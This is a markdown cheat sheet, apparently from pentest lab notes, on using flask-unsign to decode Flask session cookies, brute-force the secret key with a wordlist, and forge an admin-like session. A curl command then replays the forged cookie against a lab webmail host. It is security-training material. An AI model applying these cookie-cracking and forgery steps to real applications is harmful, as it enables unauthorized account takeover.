# flask-unsign

flask-unsign is a command-line tool used to inspect, crack, and forge client-side session cookies used by Flask web applications.

By default, Flask stores session data on the client side using the `itsdangerous` serialization library. These cookies are base64-encoded and cryptographically signed (HMAC-SHA1 or HMAC-SHA256) with a server-side `SECRET_KEY`, but they are **not encrypted**. If the server uses a weak or leaked secret key, an attacker can brute-force the secret offline and forge valid session cookies with elevated privileges (such as administrator accounts).


## Installation

`flask-unsign` can be installed in a Python virtual environment or using `pip`:

```bash
pip install flask-unsign
```

On systems with PEP 668 externally managed Python environments, install it via `pipx`:

```bash
pipx install flask-unsign
```


## 1. Decoding Session Cookies (`--decode`)

Because Flask cookies are merely serialized and signed (not encrypted), you can inspect their contents immediately without knowing the secret key:

```bash
flask-unsign --decode --cookie '<COOKIE_VALUE>'
```

For example, on [Port 8070 (InboxNow Webmail)](../services/8070.md):

```bash
flask-unsign --decode --cookie 'eyJ1c2VyIjoidXNlciJ9.avL4sQ.6YK5YB4zwongYpqTK1Jfb2fsyX0'
```

Output:
```json
{'user': 'user'}
```

This reveals the exact keys and data structure stored in the session (e.g. `user`, `role`, `is_admin`, etc.).


## 2. Cracking the Secret Key (`--unsign`)

To forge new session cookies, you need the server's `SECRET_KEY`. `flask-unsign` can brute-force this secret offline against a dictionary (such as `rockyou.txt`) at high speed without sending requests to the target server.

```bash
flask-unsign --unsign --cookie '<COOKIE_VALUE>' --wordlist ~/wordlists/rockyou.txt
```

### High-Performance Cracking Flags

When dealing with large wordlists, use multithreading and disable literal string evaluation:

```bash
flask-unsign --unsign --cookie '<COOKIE_VALUE>' \
  --wordlist ~/wordlists/rockyou.txt \
  --threads 8 \
  --no-literal-eval
```

Flags:
- `--unsign`: Initiates the secret key brute-force attack.
- `--cookie`: The raw session cookie captured from the web application.
- `--wordlist`: Path to the password dictionary.
- `--threads`: Number of concurrent worker threads (defaults to 4).
- `--no-literal-eval`: Prevents parsing lines as Python literals, speeding up dictionary traversal.

If the key is found, `flask-unsign` prints:
```text
[*] Session decodes to: {'user': 'user'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key: 'secret123'
```


## 3. Forging Malicious Sessions (`--sign`)

Once the secret key is discovered (either cracked offline or found via source code disclosure/debug endpoints), you can sign an arbitrary session payload:

```bash
flask-unsign --sign --cookie "{'user': 'postmaster'}" --secret 'secret123'
```

Output:
```text
eyJ1c2VyIjoicG9zdG1hc3RlciJ9.Z-1234.abcdef...
```

### Accessing Protected Endpoints with the Forged Cookie

Use `curl` with the `-b` (cookie) flag to authenticate as the target user:

```bash
curl -sS -b 'session=eyJ1c2VyIjoicG9zdG1hc3RlciJ9.Z-1234.abcdef...' http://10.110.3.72:8070/mailbox
```


## Quick Command Summary

| Action | Command |
| :--- | :--- |
| **Decode** | `flask-unsign --decode --cookie '<COOKIE>'` |
| **Brute-Force Secret** | `flask-unsign --unsign --cookie '<COOKIE>' --wordlist rockyou.txt --threads 8` |
| **Forge Session** | `flask-unsign --sign --cookie "{'key': 'value'}" --secret '<SECRET>'` |
